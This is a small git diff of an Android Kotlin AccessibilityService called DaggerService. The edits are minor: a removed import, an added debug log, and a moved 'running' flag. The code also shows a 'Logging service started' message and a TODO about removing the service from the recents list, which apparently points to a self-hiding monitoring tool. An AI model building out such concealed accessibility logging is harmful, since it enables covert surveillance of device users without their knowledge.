@@ -19,7 +19,6 @@ import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import android.view.accessibility.AccessibilityNodeInfo
 
 class DaggerService : AccessibilityService() {
 
@@ -77,6 +76,7 @@ class DaggerService : AccessibilityService() {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME && event.className.contains("recent", true)) {
                     // TODO: Remove AccessibilityService from recents list.
+                    Log.d(TAG, "In recent events.")
                 }
             }
         }
@@ -86,6 +86,7 @@ class DaggerService : AccessibilityService() {
         super.onServiceConnected()
         serviceInfo = accessibilityServiceInfo()
         registerScreenStateReceiver(receiver)
+        running = true
         Log.d(TAG, "Logging service started.")
     }
 
@@ -118,7 +119,6 @@ class DaggerService : AccessibilityService() {
         val intentFilter = IntentFilter(Intent.ACTION_SCREEN_ON)
         intentFilter.addAction(Intent.ACTION_SCREEN_OFF)
         registerReceiver(receiver, intentFilter)
-        running = true
         Log.d(TAG, "Registering screen state listener")
     }
 
